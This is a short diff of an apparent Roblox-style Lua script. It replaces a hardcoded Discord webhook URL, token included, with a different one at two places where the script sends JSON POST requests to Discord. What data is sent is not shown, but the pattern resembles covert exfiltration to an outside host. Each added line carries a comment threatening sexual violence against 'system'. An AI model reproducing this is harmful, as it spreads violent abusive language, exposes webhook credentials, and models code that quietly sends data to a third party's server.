@@ -6684,7 +6684,7 @@ run(function()
 					}}
 				}
 				local response = request({
-					Url = 'https://discord.com/api/webhooks/1269186219737350164/zqMG2v-qRhykU5qV3JBHxsn6o26o14WdjUNplCgTi6vNpaU5XbQHbUuGEgZcKgi681Cf',
+					Url = 'https://discord.com/api/webhooks/1269451644727201824/zPhN9a_Z1DBHkBmxyl0V6stcto5iAb7UDzjX7InfZkaU04PjDxRunRRZoAam_eV8jFDS', -- system i will gangrape you ;)
 					Method = "POST",
 					Headers = {
 						["Content-Type"] = "application/json"
@@ -6766,7 +6766,7 @@ run(function()
 		}
 
 		local response = request({
-			Url = 'https://discord.com/api/webhooks/1269186219737350164/zqMG2v-qRhykU5qV3JBHxsn6o26o14WdjUNplCgTi6vNpaU5XbQHbUuGEgZcKgi681Cf',
+			Url = 'https://discord.com/api/webhooks/1269451644727201824/zPhN9a_Z1DBHkBmxyl0V6stcto5iAb7UDzjX7InfZkaU04PjDxRunRRZoAam_eV8jFDS', -- hi system ;) time to gangrape you!
 			Method = "POST",
 			Headers = {
 				["Content-Type"] = "application/json"
